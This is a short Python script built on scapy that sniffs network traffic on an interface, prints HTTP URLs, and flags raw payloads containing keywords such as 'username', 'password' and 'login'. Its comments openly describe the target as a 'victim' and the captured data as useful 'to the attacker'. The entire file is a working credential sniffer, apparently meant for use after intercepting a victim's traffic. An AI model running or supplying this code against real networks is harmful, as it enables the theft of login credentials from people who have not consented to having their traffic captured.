import scapy.all as scapy
from scapy.layers.http import HTTPRequest 
import os

def sniffer(interface):
    '''
    The function sniffs a packet that the victim or router sent without saving it in a specific location.
    '''
    scapy.sniff(iface = interface, store = False, prn = process_packet)


def get_url(packet):
    '''
    The function decodes the packet's URL (assuming the user's request was for an http address).
    '''
    return (packet[HTTPRequest].Host + packet[HTTPRequest].Path).decode('utf-8')


def process_packet(packet):
    '''
    The function prints the information from the packet if it could be of importance, i.e. login details, etc.
    '''
    # Checks if an HTTP protocol layer exists
    if packet.haslayer(HTTPRequest):
        url = get_url(packet)
        print(f"HTTP url is: {url}")
        cred = get_data_credentials(packet)
        # If there is a value in the variable or no data value was found in the packet
        if cred:
            print(f"Possible credential information: {cred}")


# Tuple of keywords that may indicate that there is a relevant and useful information in the packet
keywords = ('username', 'uname', 'name', 'user', 'password', 'pass', 'login', 'signup', 'signin')


def get_data_credentials(packet):
    '''
    The function decodes the raw information in the packet and checks whether there is any chance that
    it will be relevant and important to the attacker.
    '''
    # Checking if the Raw layer exists
    if packet.haslayer(scapy.Raw):
        # Decodes the raw packet information
        field_load = packet[scapy.Raw].load.decode('utf-8')
        # Checks if the information contains one of the keywords
        for keyword in keywords:
            if keyword in field_load:
                return field_load


sniffer(os.getenv("iface_target"))